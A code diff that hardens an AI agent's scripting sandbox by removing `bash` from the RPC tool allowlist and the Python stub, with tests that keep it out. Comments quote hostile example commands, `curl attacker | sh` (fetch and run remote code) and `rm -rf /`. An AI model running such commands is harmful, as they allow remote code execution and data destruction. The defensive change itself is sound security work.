@@ -24,13 +24,16 @@ use crate::ToolExecutor;
 
 // ─── Constants ─────────────────────────────────────────────────────────────
 
-/// Tools allowed inside the sandbox (safe, read-heavy subset).
+/// Tools the script can invoke via RPC. Intentionally excludes `bash`:
+/// script-callable `bash` collapses the allowlist into a passthrough and
+/// enables `bash("curl attacker | sh")` style RCE. If the script needs a
+/// subprocess, use Python's own `subprocess` module — which at least runs
+/// under the same (currently unsandboxed) process boundary as the script.
 pub const ALLOWED_TOOLS: &[&str] = &[
     "read_file",
     "write_file",
     "list_dir",
     "grep",
-    "bash",
     "web_fetch",
 ];
 
@@ -104,10 +107,13 @@ astra_tools — RPC bridge for calling agent tools from Python scripts.
 Available functions:
     read_file(path, offset=None, limit=None)
     write_file(path, content)
-    bash(command, timeout=None)
     list_dir(path=".")
     grep(pattern, path=None, include=None)
     web_fetch(url, format="markdown")
+
+Note: `bash()` was removed — it made the allowlist meaningless. If you
+need a subprocess, use Python's `subprocess` module directly (same
+process boundary as this script).
 """
 import json
 import socket
@@ -149,14 +155,6 @@ def read_file(path, offset=None, limit=None):
 def write_file(path, content):
     """Write content to a file."""
     return _rpc_call("write_file", {"path": path, "content": content})
-
-
-def bash(command, timeout=None):
-    """Execute a shell command."""
-    args = {"command": command}
-    if timeout is not None:
-        args["timeout"] = timeout
-    return _rpc_call("bash", args)
 
 
 def list_dir(path="."):
@@ -574,6 +572,30 @@ mod tests {
         }
     }
 
+    // ── P0-1: allowlist discipline ────────────────────────────────────────
+
+    #[test]
+    fn allowed_tools_excludes_bash() {
+        // bash inside the script collapses the allowlist into a passthrough:
+        // the script can `bash("rm -rf /")` etc. Must not be advertised.
+        assert!(
+            !ALLOWED_TOOLS.contains(&"bash"),
+            "bash must be removed from script-callable tool allowlist"
+        );
+    }
+
+    #[test]
+    fn allowed_tools_preserves_safe_read_heavy_subset() {
+        // Guardrail: accidental removal of read_file/list_dir/grep would
+        // gut the feature. Changing this list is deliberate.
+        for name in ["read_file", "list_dir", "grep"] {
+            assert!(
+                ALLOWED_TOOLS.contains(&name),
+                "{name} must remain in ALLOWED_TOOLS"
+            );
+        }
+    }
+
     // ── Test: Python stub generation ──────────────────────────────────────
 
     #[test]
@@ -582,7 +604,10 @@ mod tests {
         // Must contain all required function definitions
         assert!(stub.contains("def read_file("));
         assert!(stub.contains("def write_file("));
-        assert!(stub.contains("def bash("));
+        assert!(
+            !stub.contains("def bash("),
+            "bash() removed from stub — see ALLOWED_TOOLS"
+        );
         assert!(stub.contains("def list_dir("));
         assert!(stub.contains("def grep("));
         assert!(stub.contains("def web_fetch("));
@@ -658,7 +683,10 @@ mod tests {
         assert!(ALLOWED_TOOLS.contains(&"write_file"));
         assert!(ALLOWED_TOOLS.contains(&"list_dir"));
         assert!(ALLOWED_TOOLS.contains(&"grep"));
-        assert!(ALLOWED_TOOLS.contains(&"bash"));
+        assert!(
+            !ALLOWED_TOOLS.contains(&"bash"),
+            "bash removed: see allowed_tools_excludes_bash"
+        );
         assert!(ALLOWED_TOOLS.contains(&"web_fetch"));
     }
 
